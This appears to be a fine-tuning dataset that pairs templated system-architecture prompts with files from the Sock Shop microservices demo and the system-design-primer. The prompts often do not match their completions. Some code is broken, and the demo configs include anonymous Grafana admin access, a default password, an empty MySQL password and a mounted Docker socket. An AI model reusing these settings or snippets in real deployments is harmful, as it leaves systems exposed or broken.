{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "version: '2'\n\nservices:\n    prometheus:\n        image: prom/prometheus\n        container_name: prometheus\n        volumes:\n          - ./prometheus.yml:/etc/prometheus/prometheus.yml\n          - ./alert.rules:/etc/prometheus/alert.rules\n        command:\n          - '--config.file=/etc/prometheus/prometheus.yml'\n          - '--storage.tsdb.path=/prometheus'\n          - '--web.console.libraries=/usr/share/prometheus/console_libraries'\n          - '--web.console.templates=/usr/share/prometheus/consoles'\n        expose:\n          - 9090\n        ports:\n          - 9090:9090\n        links:\n          - alertmanager:alertmanager\n    nodeexporter:\n        image: quay.io/prometheus/node-exporter:v1.1.2\n        container_name: nodeexporter\n        volumes:\n          - '/:/host:ro,rslave'\n        pid: host\n        command:\n          - '--path.rootfs=/host'\n        restart: unless-stopped\n        ports:\n          - 9100:9100\n    alertmanager:\n        image: prom/alertmanager\n        ports:\n          - 9093:9093\n        volumes:\n          - ./alertmanager.yml:/etc/alertmanager/config.yml\n        command:\n          - '--config.file=/etc/alertmanager/config.yml'\n          - '--storage.path=/alertmanager'\n    grafana:\n        image: grafana/grafana\n        depends_on:\n          - prometheus\n        ports:\n          - 3000:3000\n        environment:\n          - GF_SECURITY_ADMIN_PASSWORD=foobar\n          - GF_USERS_ALLOW_SIGN_UP=false\n        links:\n          - prometheus:prometheus\n    importer:\n      image: giantswarm/tiny-tools\n      depends_on:\n        - grafana\n      entrypoint: /bin/sh import.sh\n      working_dir: /opt/grafana-import-dashboards\n      volumes:\n        - ./grafana:/opt/grafana-import-dashboards\n      links:\n        - grafana:grafana\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/docker-compose/docker-compose.monitoring.yml", "language": "yaml", "complexity": "simple", "star_count": 3709, "quality_score": 0.63, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 62}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "version: '2'\n\nservices:\n  front-end:\n    image: weaveworksdemos/front-end:0.3.12\n    hostname: front-end\n    restart: always\n    cap_drop:\n      - all\n    read_only: true\n  edge-router:\n    image: weaveworksdemos/edge-router:0.1.1\n    ports:\n      - '80:80'\n      - '8080:8080'\n    cap_drop:\n      - all\n    cap_add:\n      - NET_BIND_SERVICE\n      - CHOWN\n      - SETGID\n      - SETUID\n      - DAC_OVERRIDE\n    read_only: true\n    tmpfs:\n      - /var/run:rw,noexec,nosuid\n    hostname: edge-router\n    restart: always\n  catalogue:\n    image: weaveworksdemos/catalogue:0.3.5\n    hostname: catalogue\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - NET_BIND_SERVICE\n    read_only: true\n  catalogue-db:\n    image: weaveworksdemos/catalogue-db:0.3.0\n    hostname: catalogue-db\n    restart: always\n    environment:\n      - MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD}\n      - MYSQL_ALLOW_EMPTY_PASSWORD=true\n      - MYSQL_DATABASE=socksdb\n  carts:\n    image: weaveworksdemos/carts:0.4.8\n    hostname: carts\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - NET_BIND_SERVICE\n    read_only: true\n    tmpfs:\n      - /tmp:rw,noexec,nosuid\n    environment:\n      - JAVA_OPTS=-Xms64m -Xmx128m -XX:+UseG1GC -Djava.security.egd=file:/dev/urandom -Dspring.zipkin.enabled=false\n  carts-db:\n    image: mongo:3.4\n    hostname: carts-db\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - CHOWN\n      - SETGID\n      - SETUID\n    read_only: true\n    tmpfs:\n      - /tmp:rw,noexec,nosuid\n  orders:\n    image: weaveworksdemos/orders:0.4.7\n    hostname: orders\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - NET_BIND_SERVICE\n    read_only: true\n    tmpfs:\n      - /tmp:rw,noexec,nosuid\n    environment:\n      - JAVA_OPTS=-Xms64m -Xmx128m -XX:+UseG1GC -Djava.security.egd=file:/dev/urandom -Dspring.zipkin.enabled=false\n  orders-db:\n    image: mongo:3.4\n    hostname: orders-db\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - CHOWN\n      - SETGID\n      - SETUID\n    read_only: true\n    tmpfs:\n      - /tmp:rw,noexec,nosuid\n  shipping:\n    image: weaveworksdemos/shipping:0.4.8\n    hostname: shipping\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - NET_BIND_SERVICE\n    read_only: true\n    tmpfs:\n      - /tmp:rw,noexec,nosuid\n    environment:\n      - JAVA_OPTS=-Xms64m -Xmx128m -XX:+UseG1GC -Djava.security.egd=file:/dev/urandom -Dspring.zipkin.enabled=false\n  queue-master:\n    image: weaveworksdemos/queue-master:0.3.1\n    hostname: queue-master\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - NET_BIND_SERVICE\n    read_only: true\n    tmpfs:\n      - /tmp:rw,noexec,nosuid\n  rabbitmq:\n    image: rabbitmq:3.6.8\n    hostname: rabbitmq\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - CHOWN\n      - SETGID\n      - SETUID\n      - DAC_OVERRIDE\n    read_only: true\n  payment:\n    image: weaveworksdemos/payment:0.4.3\n    hostname: payment\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - NET_BIND_SERVICE\n    read_only: true\n  user:\n    image: weaveworksdemos/user:0.4.4\n    hostname: user\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - NET_BIND_SERVICE\n    read_only: true\n    environment:\n      - MONGO_HOST=user-db:27017\n  user-db:\n    image: weaveworksdemos/user-db:0.4.0\n    hostname: user-db\n    restart: always\n    cap_drop:\n      - all\n    cap_add:\n      - CHOWN\n      - SETGID\n      - SETUID\n    read_only: true\n    tmpfs:\n      - /tmp:rw,noexec,nosuid\n  user-sim:\n    image: weaveworksdemos/load-test:0.1.1\n    cap_drop:\n      - all\n    read_only: true\n    hostname: user-simulator\n    command: \"-d 60 -r 200 -c 2 -h edge-router\"\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/docker-compose/docker-compose.yml", "language": "yaml", "complexity": "medium", "star_count": 3709, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 176}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Installing sock-shop on Kubernetes\n\nSee the [documentation](https://microservices-demo.github.io/deployment/kubernetes-minikube.html) on how to deploy Sock Shop using Minikube.\n\n## Kubernetes manifests\n\nThere are 2 sets of manifests for deploying Sock Shop on Kubernetes: one in the [manifests directory](manifests/), and complete-demo.yaml. The complete-demo.yaml is a single file manifest\nmade by concatenating all the manifests from the manifests directory, so please regenerate it when changing files in the manifests directory.\n\n## Monitoring\n\nAll monitoring is performed by prometheus. All services expose a `/metrics` endpoint. All services have a Prometheus Histogram called `request_duration_seconds`, which is automatically appended to create the metrics `_count`, `_sum` and `_bucket`.\n\nThe manifests for the monitoring are spread across the [manifests-monitoring](./manifests-monitoring) and [manifests-alerting](./manifests-alerting/) directories.\n\nTo use them, please run `kubectl create -f <path to directory>`.\n\n### What's Included?\n\n* Sock-shop grafana dashboards\n* Alertmanager with 500 alert connected to slack\n* Prometheus with config to scrape all k8s pods, connected to local alertmanager.\n\n### Ports\n\nGrafana will be exposed on the NodePort `31300` and Prometheus is exposed on `31090`. If running on a real cluster, the easiest way to connect to these ports is by port forwarding in a ssh command:\n```\nssh -i $KEY -L 3000:$NODE_IN_CLUSTER:31300 -L 9090:$NODE_IN_CLUSTER:31090 ubuntu@$BASTION_IP\n```\nWhere all the pertinent information should be entered. Grafana and Prometheus will be available on `http://localhost:3000` or `:9090`.\n\nIf on Minikube, you can connect via the VM IP address and the NodePort.\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/kubernetes/README.md", "language": "markdown", "complexity": "simple", "star_count": 3709, "quality_score": 0.6599999999999999, "features": {"has_microservices": true, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 33}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: monitoring-grafana\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      task: monitoring\n      k8s-app: grafana\n  template:\n    metadata:\n      labels:\n        task: monitoring\n        k8s-app: grafana\n    spec:\n      containers:\n      - name: grafana\n        image: gcr.io/google_containers/heapster-grafana-amd64:v4.0.2\n        ports:\n          - containerPort: 3000\n            protocol: TCP\n        volumeMounts:\n        - mountPath: /var\n          name: grafana-storage\n        env:\n        - name: INFLUXDB_HOST\n          value: monitoring-influxdb\n        - name: GRAFANA_PORT\n          value: \"3000\"\n          # The following env variables are required to make Grafana accessible via\n          # the kubernetes api-server proxy. On production clusters, we recommend\n          # removing these env variables, setup auth for grafana, and expose the grafana\n          # service using a LoadBalancer or a public IP.\n        - name: GF_AUTH_BASIC_ENABLED\n          value: \"false\"\n        - name: GF_AUTH_ANONYMOUS_ENABLED\n          value: \"true\"\n        - name: GF_AUTH_ANONYMOUS_ORG_ROLE\n          value: Admin\n        - name: GF_SERVER_ROOT_URL\n          # If you're only using the API Server proxy, set this value instead:\n          # value: /api/v1/proxy/namespaces/kube-system/services/monitoring-grafana/\n          value: /\n      volumes:\n      - name: grafana-storage\n        emptyDir: {}\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/kubernetes/autoscaling/grafana-deployment.yaml", "language": "yaml", "complexity": "simple", "star_count": 3709, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 49}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    # For use as a Cluster add-on (https://github.com/kubernetes/kubernetes/tree/master/cluster/addons)\n    # If you are NOT using this as an addon, you should comment out this line.\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: monitoring-grafana\n  name: monitoring-grafana\n  namespace: kube-system\nspec:\n  # In a production setup, we recommend accessing Grafana through an external Loadbalancer\n  # or through a public IP.\n  # type: LoadBalancer\n  # You could also use NodePort to expose the service at a randomly-generated port\n  # type: NodePort\n  type: NodePort\n  ports:\n  - port: 80\n    targetPort: 3000\n    nodePort: 30003\n  selector:\n    k8s-app: grafana\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/kubernetes/autoscaling/grafana-service.yaml", "language": "yaml", "complexity": "simple", "star_count": 3709, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 24}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\napiVersion: rbac.authorization.k8s.io/v1beta1\nkind: ClusterRoleBinding\nmetadata:\n  name: heapster\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: system:heapster\nsubjects:\n  - kind: ServiceAccount\n    name: heapster\n    namespace: kube-system\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/kubernetes/autoscaling/heapster-crb.yml", "language": "yaml", "complexity": "simple", "star_count": 3709, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 14}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: heapster\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      task: monitoring\n      k8s-app: heapster\n  template:\n    metadata:\n      labels:\n        task: monitoring\n        k8s-app: heapster\n    spec:\n      serviceAccountName: heapster\n      containers:\n      - name: heapster\n        image: gcr.io/google_containers/heapster-amd64:v1.4.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - /heapster\n        - --source=kubernetes:https://kubernetes.default\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        resources:\n          limits:\n            cpu: 100m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/kubernetes/autoscaling/heapster-deployment.yaml", "language": "yaml", "complexity": "simple", "star_count": 3709, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 34}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: heapster\n  namespace: kube-system\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/kubernetes/autoscaling/heapster-sa.yml", "language": "yaml", "complexity": "simple", "star_count": 3709, "quality_score": 0.39999999999999997, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 7}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    task: monitoring\n    # For use as a Cluster add-on (https://github.com/kubernetes/kubernetes/tree/master/cluster/addons)\n    # If you are NOT using this as an addon, you should comment out this line.\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: Heapster\n  name: heapster\n  namespace: kube-system\nspec:\n  ports:\n  - port: 80\n    targetPort: 8082\n  selector:\n    k8s-app: heapster\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/kubernetes/autoscaling/heapster-service.yaml", "language": "yaml", "complexity": "simple", "star_count": 3709, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 18}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    task: monitoring\n    # For use as a Cluster add-on (https://github.com/kubernetes/kubernetes/tree/master/cluster/addons)\n    # If you are NOT using this as an addon, you should comment out this line.\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: monitoring-influxdb\n  name: monitoring-influxdb\n  namespace: kube-system\nspec:\n  ports:\n  - port: 8086\n    targetPort: 8086\n  selector:\n    k8s-app: influxdb\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/kubernetes/autoscaling/influxdb-service.yaml", "language": "yaml", "complexity": "simple", "star_count": 3709, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 18}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "class Node(object):\n\n    def __init__(self, results):\n        self.results = results\n        self.next = next\n\n\nclass LinkedList(object):\n\n    def __init__(self):\n        self.head = None\n        self.tail = None\n\n    def move_to_front(self, node):\n        pass\n\n    def append_to_front(self, node):\n        pass\n\n    def remove_from_tail(self):\n        pass\n\n\nclass Cache(object):\n\n    def __init__(self, MAX_SIZE):\n        self.MAX_SIZE = MAX_SIZE\n        self.size = 0\n        self.lookup = {}  # key: query, value: node\n        self.linked_list = LinkedList()\n\n    def get(self, query):\n        \"\"\"Get the stored query result from the cache.\n\n        Accessing a node updates its position to the front of the LRU list.\n        \"\"\"\n        node = self.lookup.get(query)\n        if node is None:\n            return None\n        self.linked_list.move_to_front(node)\n        return node.results\n\n    def set(self, results, query):\n        \"\"\"Set the result for the given query key in the cache.\n\n        When updating an entry, updates its position to the front of the LRU list.\n        If the entry is new and the cache is at capacity, removes the oldest entry\n        before the new entry is added.\n        \"\"\"\n        node = self.lookup.get(query)\n        if node is not None:\n            # Key exists in cache, update the value\n            node.results = results\n            self.linked_list.move_to_front(node)\n        else:\n            # Key does not exist in cache\n            if self.size == self.MAX_SIZE:\n                # Remove the oldest entry from the linked list and lookup\n                self.lookup.pop(self.linked_list.tail.query, None)\n                self.linked_list.remove_from_tail()\n            else:\n                self.size += 1\n            # Add the new key and value\n            new_node = Node(results)\n            self.linked_list.append_to_front(new_node)\n            self.lookup[query] = new_node\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/object_oriented_design/lru_cache/lru_cache.py", "language": "python", "complexity": "simple", "star_count": 312958, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 67}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# 设计 Mint.com\n\n**注意：这个文档中的链接会直接指向[系统设计主题索引](https://github.com/donnemartin/system-design-primer/blob/master/README-zh-Hans.md#系统设计主题索引)中的有关部分，以避免重复的内容。您可以参考链接的相关内容，来了解其总的要点、方案的权衡取舍以及可选的替代方案。**\n\n## 第一步：简述用例与约束条件\n\n> 搜集需求与问题的范围。\n> 提出问题来明确用例与约束条件。\n> 讨论假设。\n\n我们将在没有面试官明确说明问题的情况下，自己定义一些用例以及限制条件。\n\n### 用例\n\n#### 我们将把问题限定在仅处理以下用例的范围中\n\n* **用户** 连接到一个财务账户\n* **服务** 从账户中提取交易\n    * 每日更新\n    * 分类交易\n        * 允许用户手动分类\n        * 不自动重新分类\n    * 按类别分析每月支出\n* **服务** 推荐预算\n    * 允许用户手动设置预算\n    * 当接近或者超出预算时，发送通知\n* **服务** 具有高可用性\n\n#### 非用例范围\n\n* **服务** 执行附加的日志记录和分析\n\n### 限制条件与假设\n\n#### 提出假设\n\n* 网络流量非均匀分布\n* 自动账户日更新只适用于 30 天内活跃的用户\n* 添加或者移除财务账户相对较少\n* 预算通知不需要及时\n* 1000 万用户\n    * 每个用户10个预算类别= 1亿个预算项\n    * 示例类别:\n        * Housing = $1,000\n        * Food = $200\n        * Gas = $100\n    * 卖方确定交易类别\n        * 50000 个卖方\n* 3000 万财务账户\n* 每月 50 亿交易\n* 每月 5 亿读请求\n* 10:1 读写比\n    * Write-heavy，用户每天都进行交易，但是每天很少访问该网站\n\n#### 计算用量\n\n**如果你需要进行粗略的用量计算，请向你的面试官说明。**\n\n* 每次交易的用量:\n    * `user_id` - 8 字节\n    * `created_at` - 5 字节\n    * `seller` - 32 字节\n    * `amount` - 5 字节\n    * Total: ~50 字节\n* 每月产生 250 GB 新的交易内容\n    * 每次交易 50 比特 * 50 亿交易每月\n    * 3年内新的交易内容 9 TB\n    * Assume most are new transactions instead of updates to existing ones\n* 平均每秒产生 2000 次交易\n* 平均每秒产生 200 读请求\n\n便利换算指南：\n\n* 每个月有 250 万秒\n* 每秒一个请求 = 每个月 250 万次请求\n* 每秒 40 个请求 = 每个月 1 亿次请求\n* 每秒 400 个请求 = 每个月 10 亿次请求\n\n## 第二步：概要设计\n\n> 列出所有重要组件以规划概要设计。\n\n![Imgur](http://i.imgur.com/E8klrBh.png)\n\n## 第三步：设计核心组件\n\n> 深入每个核心组件的细节。\n\n### 用例：用户连接到一个财务账户\n\n我们可以将 1000 万用户的信息存储在一个[关系数据库](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms)中。我们应该讨论一下[选择SQL或NoSQL之间的用例和权衡](https://github.com/donnemartin/system-design-primer#sql-or-nosql)了。\n\n* **客户端** 作为一个[反向代理](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)，发送请求到 **Web 服务器**\n* **Web 服务器** 转发请求到 **账户API** 服务器\n* **账户API** 服务器将新输入的账户信息更新到 **SQL数据库** 的`accounts`表\n\n**告知你的面试官你准备写多少代码**。\n\n`accounts`表应该具有如下结构：\n\n```\nid int NOT NULL AUTO_INCREMENT\ncreated_at datetime NOT NULL\nlast_update datetime NOT NULL\naccount_url varchar(255) NOT NULL\naccount_login varchar(32) NOT NULL\naccount_password_hash char(64) NOT NULL\nuser_id int NOT NULL\nPRIMARY KEY(id)\nFOREIGN KEY(user_id) REFERENCES users(id)\n```\n\n我们将在`id`，`user_id`和`created_at`等字段上创建一个[索引](https://github.com/donnemartin/system-design-primer#use-good-indices)以加速查找（对数时间而不是扫描整个表）并保持数据在内存中。从内存中顺序读取 1 MB数据花费大约250毫秒，而从SSD读取是其4倍，从磁盘读取是其80倍。<sup><a href=https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know>1</a></sup>\n\n我们将使用公开的[**REST API**](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest):\n\n```\n$ curl -X POST --data '{ \"user_id\": \"foo\", \"account_url\": \"bar\", \\\n    \"account_login\": \"baz\", \"account_password\": \"qux\" }' \\\n    https://mint.com/api/v1/account\n```\n\n对于内部通信，我们可以使用[远程过程调用](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)。\n\n接下来，服务从账户中提取交易。\n\n### 用例：服务从账户中提取交易\n\n如下几种情况下，我们会想要从账户中提取信息：\n\n* 用户首次链接账户\n* 用户手动更新账户\n* 为过去 30 天内活跃的用户自动日更新\n\n数据流:\n\n* **客户端**向 **Web服务器** 发送请求\n* **Web服务器** 将请求转发到 **帐户API** 服务器\n* **帐户API** 服务器将job放在 **队列** 中，如 [Amazon SQS](https://aws.amazon.com/sqs/) 或者 [RabbitMQ](https://www.rabbitmq.com/)\n    * 提取交易可能需要一段时间，我们可能希望[与队列异步](https://github.com/donnemartin/system-design-primer#asynchronism)地来做，虽然这会引入额外的复杂度。\n* **交易提取服务** 执行如下操作：\n    * 从 **Queue** 中拉取并从金融机构中提取给定用户的交易，将结果作为原始日志文件存储在 **对象存储区**。\n    * 使用 **分类服务** 来分类每个交易\n    * 使用 **预算服务** 来按类别计算每月总支出\n        * **预算服务** 使用 **通知服务** 让用户知道他们是否接近或者已经超出预算\n    * 更新具有分类交易的 **SQL数据库** 的`transactions`表\n    * 按类别更新 **SQL数据库** `monthly_spending`表的每月总支出\n    * 通过 **通知服务** 提醒用户交易完成\n        * 使用一个 **队列** (没有画出来) 来异步发送通知\n\n`transactions`表应该具有如下结构：\n\n```\nid int NOT NULL AUTO_INCREMENT\ncreated_at datetime NOT NULL\nseller varchar(32) NOT NULL\namount decimal NOT NULL\nuser_id int NOT NULL\nPRIMARY KEY(id)\nFOREIGN KEY(user_id) REFERENCES users(id)\n```\n\n我们将在 `id`，`user_id`，和 `created_at`字段上创建[索引](https://github.com/donnemartin/system-design-primer#use-good-indices)。\n\n`monthly_spending`表应该具有如下结构：\n\n```\nid int NOT NULL AUTO_INCREMENT\nmonth_year date NOT NULL\ncategory varchar(32)\namount decimal NOT NULL\nuser_id int NOT NULL\nPRIMARY KEY(id)\nFOREIGN KEY(user_id) REFERENCES users(id)\n```\n\n我们将在`id`，`user_id`字段上创建[索引](https://github.com/donnemartin/system-design-primer#use-good-indices)。\n\n#### 分类服务\n\n对于 **分类服务**，我们可以生成一个带有最受欢迎卖家的卖家-类别字典。如果我们估计 50000 个卖家，并估计每个条目占用不少于 255 个字节，该字典只需要大约 12 MB内存。\n\n**告知你的面试官你准备写多少代码**。\n\n```python\nclass DefaultCategories(Enum):\n\n    HOUSING = 0\n    FOOD = 1\n    GAS = 2\n    SHOPPING = 3\n    ...\n\nseller_category_map = {}\nseller_category_map['Exxon'] = DefaultCategories.GAS\nseller_category_map['Target'] = DefaultCategories.SHOPPING\n...\n```\n\n对于一开始没有在映射中的卖家，我们可以通过评估用户提供的手动类别来进行众包。在 O(1) 时间内，我们可以用堆来快速查找每个卖家的顶端的手动覆盖。\n\n```python\nclass Categorizer(object):\n\n    def __init__(self, seller_category_map, self.seller_category_crowd_overrides_map):\n        self.seller_category_map = seller_category_map\n        self.seller_category_crowd_overrides_map = \\\n            seller_category_crowd_overrides_map\n\n    def categorize(self, transaction):\n        if transaction.seller in self.seller_category_map:\n            return self.seller_category_map[transaction.seller]\n        elif transaction.seller in self.seller_category_crowd_overrides_map:\n            self.seller_category_map[transaction.seller] = \\\n                self.seller_category_crowd_overrides_map[transaction.seller].peek_min()\n            return self.seller_category_map[transaction.seller]\n        return None\n```\n\n交易实现：\n\n```python\nclass Transaction(object):\n\n    def __init__(self, created_at, seller, amount):\n        self.timestamp = timestamp\n        self.seller = seller\n        self.amount = amount\n```\n\n### 用例：服务推荐预算\n\n首先，我们可以使用根据收入等级分配每类别金额的通用预算模板。使用这种方法，我们不必存储在约束中标识的 1 亿个预算项目，只需存储用户覆盖的预算项目。如果用户覆盖预算类别，我们可以在\n`TABLE budget_overrides`中存储此覆盖。\n\n```python\nclass Budget(object):\n\n    def __init__(self, income):\n        self.income = income\n        self.categories_to_budget_map = self.create_budget_template()\n\n    def create_budget_template(self):\n        return {\n            'DefaultCategories.HOUSING': income * .4,\n            'DefaultCategories.FOOD': income * .2\n            'DefaultCategories.GAS': income * .1,\n            'DefaultCategories.SHOPPING': income * .2\n            ...\n        }\n\n    def override_category_budget(self, category, amount):\n        self.categories_to_budget_map[category] = amount\n```\n\n对于 **预算服务** 而言，我们可以在`transactions`表上运行SQL查询以生成`monthly_spending`聚合表。由于用户通常每个月有很多交易，所以`monthly_spending`表的行数可能会少于总共50亿次交易的行数。\n\n作为替代，我们可以在原始交易文件上运行 **MapReduce** 作业来：\n\n* 分类每个交易\n* 